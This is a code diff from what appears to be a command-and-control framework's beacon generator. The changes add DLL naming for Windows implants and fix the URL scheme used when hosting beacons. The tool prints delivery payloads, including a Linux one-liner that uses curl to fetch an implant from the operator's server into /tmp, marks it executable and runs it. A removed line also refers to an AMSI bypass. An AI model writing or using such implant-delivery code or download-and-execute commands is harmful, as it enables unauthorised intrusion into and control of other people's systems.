@@ -217,7 +217,11 @@ func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
 
 			beaconName := "main_"+beaconType
 			if beaconOs == "windows" {
-				beaconName += ".exe"
+				if strings.HasSuffix(beaconType, "_dll") {
+					beaconName += ".dll"
+				} else {
+					beaconName += ".exe"
+				}
 			}
 			fmt.Println(fmt.Sprintf("[+] Beacon Generated at %s", beaconName))
 
@@ -258,11 +262,16 @@ func SetGenerateBeaconCommand(conn grpc.ClientConnInterface) {
 				return nil
 			}
 
-			fmt.Println(fmt.Sprintf("Amsi bypass at %s://%s:%s%s", beaconType, beaconIP, beaconPort, beaconPath))
+			httpscheme := "http"
+			if strings.Contains(beaconType, "https") {
+				httpscheme = "https"
+			}
+
+			fmt.Println(fmt.Sprintf("Hosted Beacon at %s://%s:%s%s", httpscheme, beaconIP, beaconPort, beaconPath))
 			
 
 			fmt.Println("[+] Use the following payloads to download and run beacon")
-			beaconURL := fmt.Sprintf("%s://%s:%s%s", beaconType, beaconIP, beaconPort, beaconPath)
+			beaconURL := fmt.Sprintf("%s://%s:%s%s", httpscheme, beaconIP, beaconPort, beaconPath)
 
 			if beaconOs == "linux" {
 				fmt.Println(fmt.Sprintf("curl %s -o /tmp/rudeus; chmod +x /tmp/rudeus; /tmp/rudeus", beaconURL))
